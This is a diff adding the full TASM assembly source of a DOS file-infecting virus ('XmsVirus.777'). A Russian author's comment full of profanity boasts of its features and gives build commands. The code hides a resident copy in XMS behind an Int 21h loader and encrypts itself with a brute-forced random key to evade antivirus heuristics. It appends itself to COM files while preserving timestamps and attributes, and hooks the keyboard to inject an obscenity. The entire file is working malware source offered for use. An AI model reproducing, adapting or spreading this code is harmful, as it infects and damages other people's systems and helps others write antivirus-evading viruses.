@@ -1,0 +1,764 @@
+COMMENT %
+
+   COM.XMS-TSR.RDA-CRYPT. The basic part of virus is placed
+   into XMS, but there is a little loader into DOS memory. If it's
+   necessary, loader places XMS part of virus into the DOS memory,
+   executes it and then frees allocated DOS memory.
+
+   Ну че, не ждали, наверное? Но не надейтесь - от меня так просто не избави-
+тесь. Итак, вышел мой очередной продукт под DOS, и, как всегда, с извратами.
+Сразу хочу сказать, что я его написал за сегодняшинй день просто от нехуй де-
+лать. А что вы хотели? Я все пишу от нехуй делать. Вот вы сами то для чего пи-
+шите (если пишите вообще)? Ну да ладно, не об этом сейчас речь. Речь сейчас
+пойдет о возможностях данного продукта.
+
+   1. Вирус хранит свою резидентную копию не где-нибудь, а в XMS. "Но как же
+      он тогда может работать, раз в реальном режиме управление туда передать
+      нельзя?" - возразите вы и будете правы. Хитрость в том, что вирус остав-
+      ляет в обычной память небольшой подгрузчик и устанавливает на него вектор
+      Int 21h. Этот подгрузчик при необходимости выделяет в обычной памяти про-
+      странство, копирует туда свой код из XMS, передает ему управление, а за-
+      тем освобождает память. О том, как работает все это дело, нетрудно разо-
+      браться, посмотрев исходник. Для справки: доступ к XMS осуществляется че-
+      рез драйвер HIMEM.SYS, который, естественно, должен быть установлен. Ви-
+      рус корректно работает под Windows (там доступ к XMS всегда открыт).
+
+   2. Вирус зашифрован с применением упрощенного RDA (Radnom Decoding
+      Algoritm). Для тех, кто в танке: RDA - это алгоритм шифровки, при кото-
+      ром ключ НЕ сохраняется. "Ну и как же ты тогда собираешься производить
+      расшифровку?" - слышаться насмешливые вопли ламеров. А очень просто: кое-
+      какая информация об исходном коде все-таки остается - его контрольная
+      сумма. Для того, чтобы расшифровать код, надо брать все ключи подряд (в
+      этом вирусе они берутся из порта таймера) и расшифровывать до тех пор,
+      пока контрольная сумма не совпадет. Реально на это уходит совсем немного
+      времени, зато антивирусы с их эвристиками затыкаются. Однако знающий че-
+      ловек может спросить: "А не может ли получится так, что контрольная сумма
+      совпадет, но код при этом будет расшифрован неправильно?" Теоретически -
+      вполне может, но вероятность этого очень мала. Кстати, если вздумаете
+      что-то менять в вирусе, не забудьте подкорректировать контрольную сумму.
+      Как это сделать? Знающий человек разберется. Но если ты - мелкий ламер,
+      который просто хочет поменять мой копирайт, то пиздуй отсюда на хуй.
+      
+   3. Вирус стандартно заражает COM файлы, дописываясь в конец. Длина заражен-
+      ных файлов увеличивается на 777 байт. Обрабатывает файлы с атрибутом
+      "Read Only". Не изменяет время создания и атрибуты файла. Не глючит на
+      защищенных от записи дискетах. Корректно заражает COM файлы для Windows -
+      ENUNS, RUSNS и т.п. - но вместо этих сигнатур записывает "БЛЯNS" (кстати,
+      это также используется для проверки зараженности файла). 
+
+   4. Вирус определяет адрес настоящего обработчика Int 21h с помощью PSP. В
+      PSP:[6] находится дальный адрес, который указывает куда-то в DOS, но это
+      не то, что нам нужно. Обычно там лежат несколько дальних JMP-ов, и мы
+      проходим по их цепочке, а затем ищем обработчик Int 21h по сигнатуре. В
+      случае неудачи берем адрес из таблицы векторов.
+
+   5. Вирус перехватывает также прерывание клавиатуры и с вероятностью 1/9
+      вставляет после запятой слово "бля".
+
+                                  DJ Sadovnikov (http://i.am/djsad), 11.07.2000
+
+ ══════════════════════════════════════════════════════════════════════════════
+
+          Компилировать с помощью TASM 4.1+
+
+             tasm /m xmsvirus.asm
+             tlink /t /x xmsvirus.obj
+             del xmsvirus.com
+
+
+          Файлы из архива:
+
+             xmsvirus.asm  14600 (исходник вируса)
+             xmsvirus.com    800 (бинарник вируса)
+%
+
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+
+		.286
+Code		segment
+		assume	cs:Code, ds:Code
+		org	100h
+
+
+Start:		db	0E9h
+		dw	Virus-$-2
+
+		mov	ah, 9
+		mov	dx, offset Msg
+		int	21h
+		ret	
+
+Msg		db	'Virus is OK$'
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                            НАЧАЛО ВИРУСА
+;══════════════════════════════════════════════════════════════════════════════
+
+msr		macro	reg1, reg2
+		push	reg2
+		pop	reg1
+		endm
+
+
+Virus:		pusha
+		push	ds es
+
+		call	GetIP
+GetIP:		pop	di
+		sub	di, GetIP-Virus
+
+
+		lea	si, [Crypted-Virus+di]
+L0:		mov	cx, EndCrypt-Crypted
+		in	al, 40h
+
+
+;[Расшифровываем вирус случайным ключем]
+
+		push	cx
+L1:		xor	ds:[si], al
+		inc	si
+		loop	L1
+		pop	cx
+
+
+;[Считаем контрольную сумму]
+
+		xor	ax, ax
+L2:		dec	si
+		add	al, ds:[si]
+		adc	ah, 0
+		loop	L2
+
+
+;[Если CRC не совпала, пробуем другой ключ]
+
+CRC:		cmp	ax, 121Eh
+		jne	L0
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Восстанавливаем первые три байта зараженной программы]
+
+Crypted:	mov	ax, ds:[Old3b-Virus+di]
+		mov	ds:[100h], ax
+		mov	al, ds:[Old3b+2-Virus+di]
+		mov	ds:[102h], al
+
+
+;[Проверяем наличие вируса в памяти]
+
+		mov	ax, 0ABCDh
+		int	21h
+		cmp	ax, 0CDABh
+		jne	Install
+
+
+;[Отдаем управление зараженной программе]
+
+Exit:		pop	es ds
+		popa
+
+		push	100h
+		ret
+
+
+;[Проверяем наличие драйвера XMS]
+
+Install:	mov	ax, 4300h
+		int	2Fh
+		cmp	al, 80h
+		jne	Exit
+
+
+;[Получаем адрес менеджера XMS]
+
+		mov	ax, 4310h
+		int	2Fh
+		mov	ds:[DrXMS-Virus+di], bx
+		mov	ds:[DrXMS+2-Virus+di], es
+
+
+;[Выделяем блок в XMS]
+
+		mov	ah, 09h
+		mov	dx, CodeMem
+		call	dword ptr [DrXMS-Virus+di]
+		test	ax, ax
+		jz	Exit
+
+
+;[Настраиваем поля структур пересылки]
+
+		mov	ds:[DOStoXMS+06h-Virus+di], di
+		mov	ds:[DOStoXMS+08h-Virus+di], cs
+		mov	ds:[DOStoXMS+0Ah-Virus+di], dx
+		mov	ds:[XMStoDOS+04h-Virus+di], dx
+
+
+;[Копируем вирус в XMS]
+
+		mov	ah, 0Bh
+		lea	si, [DOStoXMS-Virus+di]
+		call	dword ptr [DrXMS-Virus+di]
+		test	ax, ax
+		jz	Exit
+
+
+;[Получаем размер текущего блока памяти]
+
+		mov	ax, cs
+		dec	ax
+		mov	ds, ax
+		mov	bx, ds:[3]
+		sub	bx, LoaderMem+1
+
+
+;[Укорачиваем текущий блок памяти]
+
+		mov	ah, 4Ah
+		msr	es, cs
+		int	21h
+		jc	Exit
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;            Нахождение адреса настоящего обработчика Int 21h
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Ищем точку входа в обработчик Int 21h]
+
+		lds	bx, cs:[6]
+Trace:		cmp	ds:[bx], byte ptr 0EAh
+		jne	Check1
+		lds	bx, ds:[bx+1]
+		jmp	Trace
+
+
+;[Первый возможный вариант обработчика Int 21h]
+
+Check1:		cmp	ds:[bx], 9090h
+		jne	Check2
+		sub	bx, 32h
+		cmp	ds:[bx], 9090h
+		je	Found
+		jmp	NotFound
+
+
+;[Второй возможный вариант обработчика Int 21h]
+
+Check2:		cmp	ds:[bx], 2E1Eh
+		jne	NotFound
+		add	bx, 25h
+		cmp	ds:[bx], 80FAh
+		je	Found
+
+
+;[В случае неудачи берем адрес из таблицы векторов]
+
+NotFound:	mov	ax, 3521h
+		int	21h
+		msr	ds, es
+
+
+;[Сохраняем адрес в Int 65h]
+
+Found:		mov	ax, 2565h
+		mov	dx, bx
+		int	21h
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Сохраняем адрес старого обработчика Int 21h]
+
+		mov	ax, 3521h
+		int	21h
+		msr	ds, cs
+		mov	ds:[Ofs21h-Virus+di], bx
+		mov	ds:[Seg21h-Virus+di], es
+
+
+;[Сохраняем адрес старого обработчика Int 09h]
+
+		mov	ax, 3509h
+		int	21h
+		mov	ds:[Ofs09h-Virus+di], bx
+		mov	ds:[Seg09h-Virus+di], es
+
+
+;[Выделяем память для Loader]
+
+		mov	ah, 48h
+		mov	bx, LoaderMem
+		int	21h
+		jc	Exit$
+
+
+;[Помечаем блок памяти как системную область]
+
+		push	ax
+		dec	ax
+		mov	ds, ax
+		mov	ds:[1], word ptr 8
+		pop	es
+
+
+;[Копируем Loader в выделенную память]
+
+		mov	cx, LoaderSize
+		lea	si, [Loader-Virus+di]
+		xor	di, di
+		msr	ds, cs
+		cld
+		rep	movsb
+
+
+;[Устанавливаем свой обработчик Int 21h]
+
+		mov	ax, 2521h
+		xor	dx, dx
+		msr	ds, es
+		int	21h
+
+
+;[Устанавливаем свой обработчик Int 09h]
+
+		mov	ax, 2509h
+		mov	dx, Int09h-Loader
+		int	21h
+Exit$:		jmp	Exit
+
+
+;[Структура для пересылки данных из DOS-памяти в XMS]
+
+DOStoXMS	dd	CodeSize	; +00h длина пересылаемых данных
+		dw	0		; +04h должно быть равно нулю
+		dw	0		; +06h смещение данных в DOS-памяти
+		dw	0		; +08h сегмент данных в DOS-памяти
+		dw	0		; +0Ah номер целевого XMS-блока
+		dd	0		; +0Ch смещение в целевом XMS-блоке 
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                                LOADER
+;══════════════════════════════════════════════════════════════════════════════
+
+Loader:		cmp	ax, 0ABCDh
+		jne	NotTest
+		xchg	ah, al
+		iret
+
+
+NotTest:	pusha
+		push	ds es
+
+		cmp	ax, 4B00h
+		jne	Quit21h
+
+
+;[Выделяем память для вируса]
+
+		mov	ah, 48h
+		mov	bx, VirMem
+		int	65h
+		jc	Quit21h
+		mov	cs:[XMStoDOS+0Eh-Loader], ax
+
+
+;[Помечаем блок памяти как системную область]
+
+		push	ax
+		dec	ax
+		mov	es, ax
+		mov	es:[1], word ptr 8
+		pop	es
+
+
+;[Копируем вирус из XMS в базовую память]
+
+		push	ds
+		mov	ah, 0Bh
+		mov	si, XMStoDOS-Loader
+		msr	ds, cs
+		db	9Ah
+DrXMS:		dd	0
+		pop	ds
+		test	ax, ax
+		jz	FreeMem
+
+
+;[Отдаем вирусу управление]
+
+		push	cs
+		push	FreeMem-Loader
+		push	es
+		push	Int21h-Virus
+		retf
+
+
+;[Освобождаем блок в базовой памяти]
+
+FreeMem:	mov	ah, 49h
+		int	65h
+
+
+;[Отдаем управление дальше по цепочке]
+
+Quit21h:	pop	es ds
+		popa
+
+		db	0EAh
+Ofs21h		dw	0
+Seg21h		dw	0
+
+
+;[Структура для пересылки данных из XMS в DOS-память]
+
+XMStoDOS	dd	CodeSize	; +00h длина пересылаемых данных
+		dw	0		; +04h номер XMS-блока
+		dd	0		; +06h смещение данных в XMS-блоке
+		dw	0		; +0Ah должно быть равно нулю
+		dw	0		; +0Ch целевое смещение в DOS-памяти
+		dw	0		; +0Eh целевой сегмент в DOS-памяти
+
+;══════════════════════════════════════════════════════════════════════════════
+
+Int09h:		pusha
+
+
+;[Проверяем, какую клавшу нажал юзер]
+
+		in	al, 60h
+		cmp	al, 33h
+		jne	Quit09h
+
+
+;[Вероятность выполнения заподла]
+
+		in	al, 40h
+		and	al, 00000011b
+		cmp	al, 00000011b
+		jne	Quit09h
+
+
+;[Записываем в буффер слово ", бля"]
+
+		xor	bx, bx
+L3:		mov	ah, 5
+		mov	ch, 0
+		mov	cl, cs:[Bla-Loader+bx]
+		int	16h
+		cmp	al, 1
+		je	Quit09h
+		inc	bx
+		cmp	bx, 5
+		jne	L3
+
+Quit09h:	popa
+
+		db	0EAh
+Ofs09h		dw	0
+Seg09h		dw	0
+
+Bla		db	', бля'
+
+LoaderSize	=	$-Loader
+LoaderMem	=	LoaderSize/16 + 1
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                          ОБРАБОТЧИК INT 21h
+;══════════════════════════════════════════════════════════════════════════════
+
+Int24h:		mov	al, 3
+		iret
+
+
+Int21h:		push	es
+
+
+;[Сохраняем вектор Int 24h]
+
+		mov	ax, 3524h
+		int	65h
+		push	es
+		push	bx
+
+
+;[Устанавливаем свой обработчик Int 24h]
+
+		push	ds dx
+		mov	ax, 2524h
+		mov	dx, Int24h-Virus
+		msr	ds, cs
+		int	65h
+		pop	dx ds
+
+
+;[Сохраняем атрибуты файла]
+
+		mov	ax, 4300h
+		int	65h
+		jc	Error
+		push	cx
+		push	dx
+		push	ds
+
+
+;[Обнуляем атрибуты файла]
+
+		mov	ax, 4301h
+		xor	cx, cx
+		int	65h
+		jc	RestAttr
+
+
+;[Открываем файл]
+
+		mov	ax, 3D02h
+		int	65h
+		jc	RestAttr
+		xchg	bx, ax
+
+
+;[Сохраняем время дату и время создания файла]
+
+		mov	ax, 5700h
+		int	65h
+		jc	Close
+		push	cx
+		push	dx
+
+
+;[Считываем первые три байта]
+
+		mov	ah, 3Fh
+		mov	cx, 3
+		mov	dx, Old3b-Virus
+		msr	ds, cs
+		int	65h
+		jc	RestTime
+		
+
+;[Проверяем тип файла]
+
+		cmp	ds:[Old3b-Virus], 'ZM'
+		jne	ComFile
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Восстанавливаем дату и время создания файла]
+
+RestTime:	mov	ax, 5701h
+		pop	dx
+		pop	cx
+		int	65h
+
+
+;[Закрываем файл]
+
+Close:		mov	ah, 3Eh
+		int	65h
+
+
+;[Восстанавливаем атрибуты файла]
+
+RestAttr:	mov	ax, 4301h
+		pop	ds
+		pop	dx
+		pop	cx
+		int	65h
+
+
+;[Восстанавливаем вектор Int 24h]
+
+Error:		mov	ax, 2524h
+		pop	dx
+		pop	ds
+		int	65h
+
+		pop	es
+		retf
+
+;══════════════════════════════════════════════════════════════════════════════
+
+;[Устанавливаем указатель на 7 позиций от конца файла]
+
+ComFile:	mov	ax, 4202h
+		mov	cx, 0FFFFh
+		mov	dx, 0FFF9h
+		int	65h
+		jc	RestTime
+
+
+;[Считываем 7 байт]
+
+		mov	ah, 3Fh
+		mov	cx, 7
+		mov	dx, Buffer-Virus
+		int	65h
+		jc	RestTime
+
+
+;[Проверяем зараженность файла и корректируем XXXNS]
+
+		cmp	ds:[Buffer-Virus], 'ЛБ'
+		je	RestTime
+		mov	ax, ds:[Buffer+5-Virus]
+		add	ax, CodeSize
+		mov	ds:[XXXNS+5-Virus], ax
+
+
+;[Устанавливаем указатель в конец файла]
+
+		mov	ax, 4202h
+		xor	cx, cx
+		xor	dx, dx
+		int	65h
+		jc	RestTime
+
+
+;[Проверяем длину файла и вычисляем адрес перехода]
+
+		or	dx, dx
+		jnz	RestTime
+		cmp	ax, 0FF00h-CodeSize
+		jae	RestTime
+		sub	ax, 3
+		jc	RestTime
+		mov	ds:[New3b+1-Virus], ax
+
+
+;[Копируем вирус в буффер]
+
+		xor	si, si
+		mov	cx, CodeSize
+L4:		mov	al, ds:[si]
+		mov	ds:[Buffer-Virus+si], al		
+		inc	si
+		loop	L4
+
+
+;[Вычисляем контрольную сумму]
+
+		xor	ax, ax
+		mov	cx, EndCrypt-Crypted
+		mov	si, (Buffer-Virus)+(EndCrypt-Virus)
+		push	cx
+L5:		dec	si
+		add	al, ds:[si]
+		adc	ah, 0
+		loop	L5
+		mov	ds:[(Buffer-Virus)+(CRC+1-Virus)], ax
+		pop	cx
+
+
+;[Шифруем вирус]
+
+		in	al, 40h
+L6:		xor	ds:[si], al
+		inc	si
+		loop	L6
+
+
+;[Записываем вирус в файл]
+
+		mov	ah, 40h
+		mov	cx, CodeSize
+		mov	dx, Buffer-Virus
+		int	65h
+		jc	RestTime$
+
+
+;[Перемещаем указатель в начало файла]
+
+		mov	ax, 4200h
+		xor	cx, cx
+		xor	dx, dx
+		int	65h
+		jc	RestTime$
+
+
+;[Записываем команду перехода на вирус]
+
+		mov	ah, 40h
+		mov	cx, 3
+		mov	dx, New3b-Virus
+		int	65h
+RestTime$:	jmp	RestTime
+
+;══════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+
+
+
+;══════════════════════════════════════════════════════════════════════════════
+;                                ДАННЫЕ
+;══════════════════════════════════════════════════════════════════════════════
+
+VirName		db	'XmsVirus.777 -- Copyright (c) by DJ Sadovnikov'
+Old3b		db	90h,90h,90h
+New3b		db	0E9h,0,0
+
+EndCrypt	label
+
+XXXNS		db	'БЛЯNS',0,0
+
+CodeSize	=	$-Virus
+CodeMem		=	CodeSize/1024 + 1
+
+Buffer		db	CodeSize dup (?)
+
+VirSize		=	$-Virus
+VirMem		=	VirSize/16 + 1
+
+
+Code		ends
+		end	Start
